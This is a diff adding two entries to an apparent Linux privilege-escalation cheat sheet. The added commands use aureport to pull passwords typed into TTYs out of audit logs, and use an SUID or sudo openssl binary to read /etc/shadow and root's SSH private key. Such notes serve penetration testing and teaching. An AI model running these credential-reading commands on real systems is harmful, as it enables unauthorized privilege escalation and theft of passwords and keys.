@@ -32,6 +32,13 @@ id
 ```
 
 * **Check your groups:** Users in the **adm** group can read many files under `/var/log/` (e.g. syslog). Look for sensitive logs or misplaced files (e.g. passwords, config snippets). If you have a user password, try `su USER` to switch and re-check `id` and file access.
+* **adm group → aureport for credentials:** If the system has Linux audit logging enabled, members of the `adm` group can use `aureport` to extract TTY input, which often captures passwords typed during `su` or `sudo`:
+
+```bash
+aureport --tty
+# Look for password strings in TTY Input lines
+# e.g.: sh: root, 2022-11-01 ... TTY Input: "sup3rS3cur3P@ssw0rd"
+```
 * **Recent sudo use:** The file `/home/USER/.sudo_as_admin_successful` exists if that user recently used sudo successfully — indicates who may have sudo rights.
 * See what is listening internally
 
@@ -1407,6 +1414,22 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 * Note that /usr/sbin/exim-4.84-3 appears in the results. Exploit is in this repo.
 * Exploit-DB, Google, and GitHub are good places to search!
 * Check GTFO Bins and Google for SUID/SGID!!!
+
+### Openssl SUID/Sudo File Read
+
+If `openssl` has the SUID bit set or is allowed via sudo, use it to read privileged files:
+
+```bash
+# Read /etc/shadow
+openssl enc -in /etc/shadow
+
+# Read SSH keys
+openssl enc -in /root/.ssh/id_rsa
+```
+
+Reference: [GTFOBins - openssl](https://gtfobins.github.io/gtfobins/openssl/)
+
+---
 
 ### SUID-Shared Object Injection
 
